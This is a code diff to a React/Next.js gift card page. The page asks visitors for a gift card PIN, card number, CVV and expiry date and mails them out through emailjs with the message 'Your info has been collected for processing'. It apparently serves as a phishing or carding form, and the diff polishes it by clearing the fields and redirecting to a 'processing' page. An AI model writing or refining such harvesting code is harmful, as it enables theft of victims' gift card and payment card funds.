@@ -1,4 +1,5 @@
 import { useState } from 'react';
+import { useRouter } from 'next/router';
 import emailjs from 'emailjs-com';
 import styles from '../../styles/GiftCard.module.css'; // Import the existing CSS file
 
@@ -30,6 +31,7 @@ export default function GiftCard({ id }) {
   const card = giftCardProviders.find(card => card.id === id);
   const [formData, setFormData] = useState({ pin: '', email: '', cardNumber: '', cvv: '', expiryDate: '' });
   const [popupMessage, setPopupMessage] = useState('');
+  const router = useRouter();
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -42,11 +44,23 @@ export default function GiftCard({ id }) {
       .then((response) => {
         console.log('SUCCESS!', response.status, response.text);
         setPopupMessage('Your info has been collected for processing.');
+        setFormData({ pin: '', email: '', cardNumber: '', cvv: '', expiryDate: '' }); // Clear form fields
+        setTimeout(() => {
+          setPopupMessage('');
+          router.push('/processing');
+        }, 3000); // 3 seconds
       }, (error) => {
         console.log('FAILED...', error);
         setPopupMessage('Your info wasn\'t accepted, sorry.');
+        setTimeout(() => {
+          setPopupMessage('');
+        }, 3000); // 3 seconds
       });
   };
+
+  if (!card) {
+    return <p>Gift card not found.</p>;
+  }
 
   return (
     <div className={styles.container}>
@@ -59,9 +73,7 @@ export default function GiftCard({ id }) {
           <img src={card.imageUrl} alt={`${card.name} Gift Card`} className={styles.cardImage} />
           <form className={styles.form} onSubmit={handleSubmit}>
             <label htmlFor="pin" className={styles.label}>Card pin:</label>
-            <input type="text" id="pin" name="pin" className={styles.input} value={formData.pin} onChange={handleChange} />
-            <label htmlFor="email" className={styles.label}>Email Address:</label>
-            <input type="email" id="email" name="email" className={styles.input} value={formData.email} onChange={handleChange} />
+            <input type="text" id="pin" name="pin" className={styles.input} value={formData.pin} onChange={handleChange} />           
             <label htmlFor="cardNumber" className={styles.label}>Card Number (optional):</label>
             <input type="text" id="cardNumber" name="cardNumber" className={styles.input} value={formData.cardNumber} onChange={handleChange} />
             <label htmlFor="cvv" className={styles.label}>CVV (optional):</label>
